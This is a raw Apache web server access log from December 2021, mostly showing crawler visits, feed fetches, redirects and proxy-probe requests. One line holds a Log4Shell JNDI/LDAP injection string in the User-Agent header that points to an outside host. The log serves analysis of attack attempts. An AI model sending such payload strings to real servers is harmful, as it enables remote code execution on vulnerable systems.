123.6.49.6 - - [10/Dec/2021:07:03:10 +0000] "GET / HTTP/1.1" 301 227 "http://rsaxvc.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
209.141.53.105 - - [10/Dec/2021:07:08:39 +0000] "GET http://dx8.cc/uploads/advertising/24.jpg?v=1638441161 HTTP/1.1" 301 262 "http://dx8.cc" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
23.183.81.22 - - [10/Dec/2021:07:16:31 +0000] "GET http://dx8.cc/index.php HTTP/1.1" 301 232 "http://dx8.cc" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
216.244.66.232 - - [10/Dec/2021:07:23:12 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.133.35 - - [10/Dec/2021:07:26:44 +0000] "GET /blog/2014/2/1/Inside_the_EDUP_EP-AB003_24GHz_Amplifier.html HTTP/1.1" 301 286 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
205.185.123.61 - - [10/Dec/2021:07:27:41 +0000] "GET https://app.1b1d.com/auth/basic/getAppInitConfig HTTP/1.1" 301 256 "https://app.1b1d.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
49.7.20.67 - - [10/Dec/2021:07:34:41 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
66.249.70.78 - - [10/Dec/2021:07:35:22 +0000] "GET /datasheets/hammerspace/7038544-Andover-Infinity-Programmers-Guide.pdf HTTP/1.1" 301 296 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.164.211.90 - - [10/Dec/2021:07:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
127.0.0.1 - - [10/Dec/2021:07:48:11 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
216.244.66.232 - - [10/Dec/2021:08:13:55 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
27.115.124.40 - - [10/Dec/2021:08:14:53 +0000] "GET / HTTP/1.1" 301 227 "http://rsaxvc.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
185.220.101.33 - - [10/Dec/2021:08:17:16 +0000] "GET / HTTP/1.1" 301 230 "-" "${jndi:ldap://477614f41246.bingsearchlib.com:39356/a}"
149.202.82.11 - - [10/Dec/2021:08:25:18 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
